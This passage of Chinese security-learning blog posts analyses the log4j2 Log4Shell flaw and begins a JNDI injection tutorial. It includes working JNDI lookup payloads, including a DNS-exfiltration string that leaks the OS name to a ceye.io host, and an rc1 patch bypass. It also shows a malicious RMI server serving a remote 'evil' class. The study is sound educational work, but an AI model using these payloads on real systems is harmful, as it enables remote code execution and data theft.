punctuation">&lt;</span>PatternLayout</span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %level %logger&#123;36&#125; - %msg%n<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Console</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appenders</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>loggers</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>loggers</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span></code></pre><p>log4j2中包含两个关键组件<code>LogManager</code>和<code>LoggerContext</code>。<code>LogManager</code>是Log4J2启动的入口，可以初始化对应的<code>LoggerContext</code>。<code>LoggerContext</code>会对配置文件进行解析等其它操作。</p><p>在不使用slf4j的情况下常见的Log4J用法是从LogManager中获取Logger接口的一个实例，并调用该接口上的方法。运行下列代码查看打印结果</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604145321617.png" alt="image-20230604145321617"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604145339868.png" alt="image-20230604145339868"></p><h2 id="属性占位符之Interpolator插值器"><a href="#属性占位符之Interpolator插值器" class="headerlink" title="属性占位符之Interpolator插值器"></a>属性占位符之Interpolator插值器</h2><p>log4j2中环境变量键值对被封装为了StrLookup对象。这些变量的值可以通过属性占位符来引用，格式为:<code>$&#123;prefix:key&#125;</code>。在Interpolator插值器内部以Map的方式则封装了多个StrLookup对象，如下图显示：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604150135457.png" alt="image-20230604150135457"></p><p>简单说就是通过${prefix:key}这种方式可以调用这里面存的环境变量</p><p>然后在输出错误信息的时候</p><p>会进行一个检测</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604150546298.png" alt="image-20230604150546298"></p><p>先找strLookupMap里有没有这个prefix</p><p>比如这里这个prefix就是java</p><p>然后就会去调用对应的lookup方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604151107758.png" alt="image-20230604151107758"></p><p>假如我把java改成marker</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604151221638.png" alt="image-20230604151221638"></p><p>那再假如这里不是marker，而是jndi，那调用的就会是jndi的lookup，就有可能会造成jndi的注入</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604151534344.png" alt="image-20230604151534344"></p><p>这里虽然是JndiLookup，但是看名字最后调用的应该就是jndi的lookup，先不往下跟了，之后再说</p><h2 id="模式布局"><a href="#模式布局" class="headerlink" title="模式布局"></a>模式布局</h2><p>log4j2支持通过配置Layout打印格式化的指定形式日志，可以在Appenders的后面附加Layouts来完成这个功能。常用之一有<code>PatternLayout</code>，也就是我们在配置文件中<code>PatternLayout</code>字段所指定的属性<code>pattern</code>的值<code>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %level %logger&#123;36&#125; - %msg%n</code>。 <code>%msg</code>表示所输出的消息</p><p><code>PatternLayout</code>模式布局会通过PatternProcessor模式解析器，对模式字符串进行解析，得到一个<code>List&lt;PatternConverter&gt;</code>转换器列表和<code>List&lt;FormattingInfo&gt;</code>格式信息列表。在配置文件<code>PatternLayout</code>标签的<code>pattern</code>属性中我们可以看到类似%d的写法，d代表一个转换器名称，log4j2会通过<code>PluginManager</code>收集所有类别为Converter的插件,同时分析插件类上的@ConverterKeys注解,获取转换器名称,并建立名称到插件实例的映射关系，当PatternParser识别到转换器名称的时候,会查找映射。</p><table><thead><tr><th>序号</th><th>名称</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>d date</td><td>DatePatternConverter</td><td>日志的时间戳</td></tr><tr><td>2</td><td>p level</td><td>LevelPatternConverter</td><td>日志级别</td></tr><tr><td>3</td><td>m msg message</td><td>MessagePatternConverter</td><td>日志中的消息内容</td></tr><tr><td>4</td><td>C class</td><td>ClassNamePatternConverter</td><td>日志打印点所在类的类名 <strong>注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置</strong></td></tr><tr><td>5</td><td>M method</td><td>MethodLocationPatternConverter</td><td>日志打印点所在方法的方法名 <strong>注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置</strong></td></tr><tr><td>6</td><td>c logger</td><td>LoggerPatternConverter</td><td>Logger实例的名称</td></tr><tr><td>7</td><td>n</td><td>LineSeparatorPatternConverter</td><td>专门追加换行符</td></tr><tr><td>8</td><td>properties</td><td>Log4j1MdcPatternConverter</td><td></td></tr><tr><td>9</td><td>ndc</td><td>Log4j1NdcPatternConverter</td><td></td></tr><tr><td>10</td><td>enc encode</td><td>EncodingPatternConverter</td><td></td></tr><tr><td>11</td><td>equalsIgnoreCase</td><td>EqualsIgnoreCaseReplacementConverter</td><td></td></tr><tr><td>12</td><td>equals</td><td>EqualsReplacementConverter</td><td></td></tr><tr><td>13</td><td>xEx xThroable xException</td><td>ExtendedThrowablePatternConverter</td><td></td></tr><tr><td>14</td><td>F file</td><td>FileLocationPatternConverter</td><td><strong>注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置</strong></td></tr><tr><td>15</td><td>l location</td><td>FullLocationPatternConverter</td><td>相当于%C.%M(%F:%L) <strong>注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置</strong></td></tr><tr><td>16</td><td>highlight</td><td>HighlightConverter</td><td></td></tr><tr><td>17</td><td>L line</td><td>LineLocationPatternConverter</td><td>日志打印点的代码行数 <strong>注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置</strong></td></tr><tr><td>18</td><td>K map MAP</td><td>MapPatternConverter</td><td></td></tr><tr><td>19</td><td>marker</td><td>MarkerPatternConverter</td><td>打印完整标记,格式如:标记名[父标记名[祖父标记名]],一个标记可以有多个父标记</td></tr><tr><td>20</td><td>markerSimpleName</td><td>MarkerSimpleNamePatternConverter</td><td>只打印标记的名称</td></tr><tr><td>21</td><td>maxLength maxLen</td><td>MaxLengthConverter</td><td></td></tr><tr><td>22</td><td>X mdc MDC</td><td>MdcPatternConverter</td><td><code>LogEvent.getContextData()</code>映射诊断上下文</td></tr><tr><td>23</td><td>N nano</td><td>NanoTimePatternConverter</td><td></td></tr><tr><td>24</td><td>x NDC</td><td>NdcPatternConverter</td><td><code>LogEvent.getContextStack()</code>嵌套诊断上下文</td></tr><tr><td>25</td><td>replace</td><td>RegexReplacementConverter</td><td></td></tr><tr><td>26</td><td>r relative</td><td>RelativeTimePatternConverter</td><td></td></tr><tr><td>27</td><td>rEx rThrowable rException</td><td>RootThrowablePatternConverter</td><td></td></tr><tr><td>28</td><td>style</td><td>StyleConverter</td><td></td></tr><tr><td>29</td><td>T tid threadId</td><td>ThreadIdPatternConverter</td><td>线程id</td></tr><tr><td>30</td><td>t tn thread threadName</td><td>ThreadNamePatternConverter</td><td>线程名称</td></tr><tr><td>31</td><td>tp threadPriority</td><td>ThreadPriorityPatternConverter</td><td>线程优先级</td></tr><tr><td>32</td><td>ex throwable Exception</td><td>ThrowablePatternConverter</td><td>异常</td></tr><tr><td>33</td><td>u uuid</td><td>UuidPatternConverter</td><td>生成一个uuid,随日志一起打印,用于唯一标识一条日志</td></tr><tr><td>34</td><td>notEmpty varsNotEmpty variablesNotEmpty</td><td>VariablesNotEmptyReplacementConverter</td><td></td></tr></tbody></table><p>简单说就是如果配置文件里写的是%msg这种，就去找MessagePatternConverter进行处理</p><p>这个MessagePatternConverter也是log4j漏洞产生的一个重要原因</p><h2 id="日志级别"><a href="#日志级别" class="headerlink" title="日志级别"></a>日志级别</h2><p>log4j2支持多种日志级别，通过日志级别我们可以将日志信息进行分类，在合适的地方输出对应的日志。哪些信息需要输出，哪些信息不需要输出，只需在一个日志输出控制文件中稍加修改即可。级别由高到低共分为6个：<code>fatal(致命的), error, warn, info, debug, trace(堆栈)。</code>  log4j2还定义了一个内置的标准级别<code>intLevel</code>，由数值表示，级别越高数值越小。</p><p>当日志级别（调用）大于等于系统设置的<code>intLevel</code>的时候，log4j2才会启用日志打印。在存在配置文件的时候 ，会读取配置文件中<code>&lt;root level=&quot;error&quot;&gt;</code>值设置<code>intLevel</code>。当然我们也可以通过<code>Configurator.setLevel(&quot;当前类名&quot;, Level.INFO);</code>来手动设置。</p><p>如果没有配置文件也没有指定则会默认使用Error级别，也就是200</p><h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h1><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>网上最常见的就是dnslog的payload</p><pre class="language-java" data-language="java"><code class="language-java">$&#123;jndi:ldap:&#x2F;&#x2F;xxxx.ceye.io&#125;</code></pre><p>其实就是调用jndi的lookup，然后url就是dns://xxxx.ceye.io。让被攻击侧往这个url上发起dns请求</p><p>这里我就直接用ldap弹计算器了</p><p>首先是开启一个本地的ldap服务端，然后python在恶意字节码目录下起个服务</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604163412225.png" alt="image-20230604163412225"></p><p>跟一下流程</p><p>把断点下在<code>org/apache/logging/log4j/core/appender/AbstractOutputStreamAppender.java</code>中的<code>directEncodeEvent</code>方法上</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604163717093.png" alt="image-20230604163717093"></p><p>这里会获取当前使用的布局，然后调用对应的encode方法</p><p>默认的话就是PatternLayout</p><p>所以就会调用PatternLayout的encode方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604163829932.png" alt="image-20230604163829932"></p><p>这里面有个toText方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604163928931.png" alt="image-20230604163928931"></p><p>接着进入toSerializable</p><p>这里边就会调用不同的Converter来处理传入的数据</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604164138244.png" alt="image-20230604164138244"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604164227823.png" alt="image-20230604164227823"></p><p>这里我们只跟MessagePatternConverter  </p><p>在MessagePatternConverter 的format里，对字符串进行了处理</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604164448382.png" alt="image-20230604164448382"></p><p>最主要的就是这个if里</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604165229803.png" alt="image-20230604165229803"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604165308270.png" alt="image-20230604165308270"></p><p>可以看到第二行重设了workingBuilder这个StringBuilder对象的长度，把原本的83改成了50</p><p>这个50就是在输出的这行日志中出现$字符的位置</p><p>也就是说把${jndi:ldap://127.0.0.1:9999/exp}单独切了出来，不在workingBuilder里了</p><p>然后最后一行又进行了一个append操作，加入的内容是config.getStrSubstitutor().replace(event, value)</p><p>这里又是个替换</p><blockquote><p>使用 Apache Commons Configuration 库中的 <code>StrSubstitutor</code> 对象来替换字符串中的占位符。</p><p><code>StrSubstitutor</code> 是一个用于替换字符串中的变量的工具类。它可以根据提供的键值对，将字符串中的占位符替换为对应的值。通常情况下，占位符使用 <code>$&#123;&#125;</code> 或者 <code>$()</code> 包围。</p></blockquote><p>value就是我们之前切出来的${jndi:ldap://127.0.0.1:9999/exp}</p><p>继续跟进会到Interpolator.lookup</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604170321668.png" alt="image-20230604170321668"></p><p>这里就是之前说的插值器的地方</p><p>先根据var.indexOf(<em>PREFIX_SEPARATOR</em>);判断&quot;:&quot;之前的字符</p><p>再通过</p><pre class="language-java" data-language="java"><code class="language-java">final String prefix &#x3D; var.substring(0, prefixPos).toLowerCase(Locale.US);final String name &#x3D; var.substring(prefixPos + 1);</code></pre><p>把第一个:前后的东西分离</p><p>然后因为我们这里是jndi，所以这里的lookup就是JndiLookup</p><p>很自然就进JndiLookup的lookup方法里了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604170942269.png" alt="image-20230604170942269"></p><p>继续进jndiManager.lookup</p><p>这个jndiName就是我们写的恶意ldap的url了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604171109684.png" alt="image-20230604171109684"></p><p>现在到了InitialContext的lookup里了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604171437462.png" alt="image-20230604171437462"></p><p>后边就纯ldap的jndi的路了</p><p>恶意url也传进去了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604171604286.png" alt="image-20230604171604286"></p><p>到这里漏洞流程就结束了，但是还有一点问题</p><p>比如在源码解析里的日志级别好像并没有提到</p><p>日志级别也是影响是否能实现log4j2漏洞的一个因素</p><p>原因就是不管输出哪个级别的日志，都要调用这一个方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604172239250.png" alt="image-20230604172239250"></p><p>logIfEnabled方法用来判断日志优先级</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604172342240.png" alt="image-20230604172342240"></p><p>由于默认情况下是error，所以小于error的warn, info, debug, trace都不会满足这个判断，直接就返回了，不能接着往下走，也就不会触发漏洞了</p><p>可以在配置文件里自行设置优先级</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604172559918.png" alt="image-20230604172559918"></p><h2 id="外带"><a href="#外带" class="headerlink" title="外带"></a>外带</h2><p>就dnslog外带，也没啥特别的，只不过是借助log4j2的递归解析</p><pre class="language-java" data-language="java"><code class="language-java">$&#123;jndi:ldap:&#x2F;&#x2F;$&#123;java:os&#125;.2lnhn2.ceye.io&#125;</code></pre><p>先解析${java:os}，把东西拿到，然后再去发起请求</p><h2 id="rc1绕过"><a href="#rc1绕过" class="headerlink" title="rc1绕过"></a>rc1绕过</h2><p>在爆出log4j2这个核弹级漏洞后，apache自然是进行了修复</p><p>这次修复把MessagePatternConverter这个类进行了大改</p><p>我直接截个先知社区的图</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604173121165.png" alt="image-20230604173121165"></p><p>并且在 2.15.0-rc1的更新包中，移除了从 Properties 中获取 Lookup 配置的选项，并修改判断逻辑，默认不开启 lookup 功能。</p><p>还有就是在<code>JndiManager#lookup</code> 方法中添加了校验，使用了 JndiManagerFactory 来创建 JndiManager 实例，不再使用 InitialContext，而是使用子类 InitialDirContext，并为其添加白名单 JNDI 协议、白名单主机名、白名单类名。</p><p>感觉不是很好利用，属于是除了ctf故意出题想不到还存在的场景了</p><p>所以就简单说了</p><p>rc1把format挪到LookupMessagePatternConverter里了</p><p>而只有在开启 lookup 功能时才会使用 <code>LookupMessagePatternConverter</code> 来进行 Lookup 和替换</p><p>所以必须在配置文件里开启lookup才行</p><p>就是在%msg后边加个{lookups}</p><p>然后又因为还有个地址校验，只允许本地的发起请求了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604180008800.png" alt="image-20230604180008800"></p><p>但是这个东西有个最离谱的问题，就是它的catch里没return</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604180145857.png" alt="image-20230604180145857"></p><p>所以只要try里报错，就直接进this.context.lookup了</p><p>所以就在exp前边加个空格让触发 <code>URISyntaxException</code> 异常</p><pre class="language-poc" data-language="poc"><code class="language-poc">$&#123;jndi:ldap:&#x2F;&#x2F;127.0.0.1:9999&#x2F; exp&#125;</code></pre><h2 id="rc2"><a href="#rc2" class="headerlink" title="rc2"></a>rc2</h2><p>在catch里把return加上了</p><p>似乎是还有绕过方法，但是对于那种配置文件要求苛刻的绕过，感觉意义不是很大</p><h2 id="2-16-0-rc1"><a href="#2-16-0-rc1" class="headerlink" title="2.16.0-rc1"></a>2.16.0-rc1</h2><p>直接不支持日志信息的lookup了，所以log4j2漏洞就彻底结束了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>看起来log4j2的原理并不麻烦，甚至有点简单，但是我还是有点不太理解的地方，就是log4j2作为一个日志，为什么要去支持jndi的lookup，为什么要去远程请求东西。（可能确实用处不大吧，毕竟2.16版本直接删了</p><p>另外对于log4j2的jndi注入还衍生出了许多技巧。例如编码绕过、关键字截取、Appenders等，这里就不详细写了，用到再搜吧（</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://su18.org/post/log4j2/">https://su18.org/post/log4j2/</a></p><p><a href="https://paper.seebug.org/1789/">https://paper.seebug.org/1789/</a></p><p><a href="https://blog.csdn.net/dreamthe/article/details/123230283">log4j2漏洞原理和漏洞环境搭建复现_log4j2原理_糊涂是福yyyy的博客-CSDN博客</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDI注入</title>
      <link href="/2023/05/22/JNDI%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/22/JNDI%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>终于学到JNDI了，其实最开始的时候我是在学fastjson的，然后发现fastjson要用JNDI，所以又想去学JNDI，但是JNDI里又用了很多RMI的内容，所以只好花了几天把之前看了个开头的RMI重新看了一遍。</p><h1 id="JNDI概述"><a href="#JNDI概述" class="headerlink" title="JNDI概述"></a>JNDI概述</h1><p>JNDI(Java Naming and Directory Interface，Java命名和目录接口)是为Java应用程序提供命名和目录访问服务的API，允许客户端通过名称发现和查找数据、对象，用于提供基于配置的动态调用。这些对象可以存储在不同的命名或目录服务中，例如RMI、CORBA、LDAP、DNS等。<br>其中Naming Service类似于哈希表的K/V对，通过名称去获取对应的服务。Directory Service是一种特殊的Naming Service，用类似目录的方式来存取服务。</p><p>这些命名/目录服务提供者有</p><ul><li>RMI（JAVA远程方法调用）</li><li>LDAP（轻量级目录访问协议）</li><li>CORBA（公共对象请求代理体系结构）</li><li>DNS（域名服务）</li></ul><p>在JNDI注入的过程中我们常用的就是RMI和LDAP</p><p>（下面这个表是抄的，不太确定，感觉在JDK8的时候最起码应该是8u121吧</p><table><thead><tr><th></th><th>JDK6</th><th>JDK7</th><th>JDK8</th><th>JDK11</th></tr></thead><tbody><tr><td>RMI可用</td><td>6u132以下</td><td>7u122以下</td><td>8u113以下</td><td>无</td></tr><tr><td>LDAP可用</td><td>6u211以下</td><td>7u201以下</td><td>8u191以下</td><td>11.0.1以下</td></tr></tbody></table><h2 id="JNDI结构"><a href="#JNDI结构" class="headerlink" title="JNDI结构"></a>JNDI结构</h2><p>在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是：</p><pre class="language-none"><code class="language-none">javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类；javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；javax.naming.event：在命名目录服务器中请求事件通知；javax.naming.ldap：提供LDAP支持；javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</code></pre><h2 id="JNDI里的类"><a href="#JNDI里的类" class="headerlink" title="JNDI里的类"></a>JNDI里的类</h2><p>写一点jndi要用到的类的作用</p><h3 id="InitialContext类"><a href="#InitialContext类" class="headerlink" title="InitialContext类"></a>InitialContext类</h3><h4 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h4><pre class="language-java" data-language="java"><code class="language-java">InitialContext() 构建一个初始上下文。  InitialContext(boolean lazy) 构造一个初始上下文，并选择不初始化它。  InitialContext(Hashtable&lt;?,?&gt; environment) 使用提供的环境构建初始上下文。 </code></pre><p>代码：</p><pre class="language-java" data-language="java"><code class="language-java">InitialContext initialContext &#x3D; new InitialContext();</code></pre><p>在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。</p><h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><pre class="language-java" data-language="java"><code class="language-java">bind(Name name, Object obj) 将名称绑定到对象。 list(String name) 枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。lookup(String name) 检索命名对象。 rebind(String name, Object obj) 将名称绑定到对象，覆盖任何现有绑定。 unbind(String name) 取消绑定命名对象。 </code></pre><p>代码：</p><pre class="language-java" data-language="java"><code class="language-java">package com.rmi.demo;import javax.naming.InitialContext;import javax.naming.NamingException;public class jndi &#123;    public static void main(String[] args) throws NamingException &#123;        String uri &#x3D; &quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;work&quot;;        InitialContext initialContext &#x3D; new InitialContext();        initialContext.lookup(uri);    &#125;&#125;</code></pre><h3 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h3><p>该类也是在<code>javax.naming</code>的一个类，该类表示对在命名/目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。</p><h4 id="构造方法-1"><a href="#构造方法-1" class="headerlink" title="构造方法"></a>构造方法</h4><pre class="language-java" data-language="java"><code class="language-java">Reference(String className) 为类名为“className”的对象构造一个新的引用。  Reference(String className, RefAddr addr) 为类名为“className”的对象和地址构造一个新引用。  Reference(String className, RefAddr addr, String factory, String factoryLocation) 为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。  Reference(String className, String factory, String factoryLocation) 为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </code></pre><p>代码：</p><pre class="language-java" data-language="java"><code class="language-java">String url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;;Reference reference &#x3D; new Reference(&quot;test&quot;, &quot;test&quot;, url);</code></pre><p>参数1：<code>className</code> - 远程加载时所使用的类名</p><p>参数2：<code>classFactory</code> - 加载的<code>class</code>中需要实例化类的名称</p><p>参数3：<code>classFactoryLocation</code> - 提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>协议</p><h4 id="常用方法-1"><a href="#常用方法-1" class="headerlink" title="常用方法"></a>常用方法</h4><pre class="language-java" data-language="java"><code class="language-java">void add(int posn, RefAddr addr) 将地址添加到索引posn的地址列表中。  void add(RefAddr addr) 将地址添加到地址列表的末尾。  void clear() 从此引用中删除所有地址。  RefAddr get(int posn) 检索索引posn上的地址。  RefAddr get(String addrType) 检索地址类型为“addrType”的第一个地址。  Enumeration&lt;RefAddr&gt; getAll() 检索本参考文献中地址的列举。  String getClassName() 检索引用引用的对象的类名。  String getFactoryClassLocation() 检索此引用引用的对象的工厂位置。  String getFactoryClassName() 检索此引用引用对象的工厂的类名。    Object remove(int posn) 从地址列表中删除索引posn上的地址。  int size() 检索此引用中的地址数。  String toString() 生成此引用的字符串表示形式。  </code></pre><p>代码：</p><pre class="language-java" data-language="java"><code class="language-java">package com.rmi.demo;import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.NamingException;import javax.naming.Reference;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class jndi &#123;    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException &#123;        String url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;;         Registry registry &#x3D; LocateRegistry.createRegistry(1099);        Reference reference &#x3D; new Reference(&quot;test&quot;, &quot;test&quot;, url);        ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(reference);        registry.bind(&quot;aa&quot;,referenceWrapper);    &#125;&#125;</code></pre><h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>以一个rmi服务为例子，你先得创建一个rmi服务，然后再创建JNDI的服务端和客户端，文件结构就是之前文章中的RMI基础上再加上JNDI服务端和客户端</p><p>JNDI服务端</p><pre class="language-java" data-language="java"><code class="language-java">public class JNDIRMIServer &#123;    public static void main(String[] args) throws NamingException, RemoteException &#123;        InitialContext initialContext&#x3D;new InitialContext();        initialContext.rebind(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;remoteobj&quot;,new IRemoteObjImpl());    &#125;&#125;</code></pre><p>JNDI客户端</p><pre class="language-java" data-language="java"><code class="language-java">public class JNDIRMIClient &#123;    public static void main(String[] args) throws NamingException, RemoteException &#123;        InitialContext initialContext&#x3D;new InitialContext();        IRemoteObj lookup &#x3D; (IRemoteObj) initialContext.lookup(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;remoteobj&quot;);        System.out.println(lookup.sayHello());    &#125;&#125;</code></pre><p>然后启动RMI服务端和JNDI服务端，再启动JNDI客户端，就能得到调用hello方法的结果（感觉和RMI区别不是很大</p><p>这里跟一下lookup和rebind会发现其实调的就是RMI的时候的那个</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230522220911731.png" alt="image-20230522220911731"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230522221121135.png" alt="image-20230522221121135"></p><p>所以这里打rmi的几个方法打JNDI应该也行（<del>没试过，猜的</del>，试了一下客户端恶意传参打服务端和绕JEP290的payload，确实能打</p><h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>JNDI注入有以下几个条件</p><p>1.使用lookup</p><p>2.参数可控</p><p>在基本使用的部分，我们使用JNDI结合RMI进行了测试，但是在一般的JNDI注入中，我们绑定的都是引用对象（JNDI Reference）</p><h2 id="基于RMI"><a href="#基于RMI" class="headerlink" title="基于RMI"></a>基于RMI</h2><p>先看基于RMI的JNDI注入，这里服务端代码为</p><pre class="language-java" data-language="java"><code class="language-java">public class JNDIRMIServer &#123;    public static void main(String[] args) throws NamingException, RemoteException &#123;&#x2F;&#x2F;        LocateRegistry.createRegistry(1099);        LocateRegistry.createRegistry(1099);        InitialContext initialContext&#x3D;new InitialContext();&#x2F;&#x2F;创建一个引用，第一个参数是恶意class的名字，第二个参数是beanfactory的名字，我们自定义(和class文件对应),第三个参数表示恶意class的地址。url最后的斜线一定要加，不然会访问不到对应的class文件        Reference reference &#x3D; new Reference(&quot;evil&quot;, &quot;evil&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;&quot;);        initialContext.bind(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;remoteobj&quot;,reference);    &#125;&#125;</code></pre><p>这里第一个evil就相当于这个恶意class类叫evil.class，第二个evil就相当于这个evil.class里的evil类</p><p>客户端</p><pre class="language-java" data-language="java"><code class="language-java">import javax.naming.InitialContext;import javax.naming.NamingException;import java.rmi.RemoteException;public class JNDIRMIClient &#123;    public static void main(String[] args) throws NamingException, RemoteException &#123;        InitialContext initialContext&#x3D;new InitialContext();        IRemoteObj lookup &#x3D; (IRemoteObj) initialContext.lookup(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;remoteobj&quot;);        System.out.println(lookup.sayHello());    &#125;&#125;</code></pre><p>这东西原理其实挺简单的，就我们可以控制客户端lookup里的值，所以就可以控制客户端去请求我们的恶意服务端，然后服务端就会给客户端返回一个Reference类型的值，接下来客户端就想去找这个东西，这里找的过程是先去看本地有没有，本地没有就会去我们给的那个地址上去请求</p><p>这里可以写一下流程</p><p>首先是绑定的时候，之前RMI提到过，想绑定，那这个必须实现Remote接口和继承UnicastRemoteObject</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523172704114.png" alt="image-20230523172704114"></p><p>那我们怎么能绑定它呢？</p><p>首先想到的肯定是找个东西封装一下</p><p>我们这里选择ReferenceWrapper类</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523172810330.png" alt="image-20230523172810330"></p><p>所以有一些博客就在恶意服务端里加了一句</p><p><code>ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);</code></p><p>但其实这是完全多余的行为</p><p>我们可以跟一下调用的bind方法，可以知道最后在RegistyContext里会进RMI自己的lookup，同时还对我们传进去的东西执行了个encodeObject的方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523173123316.png" 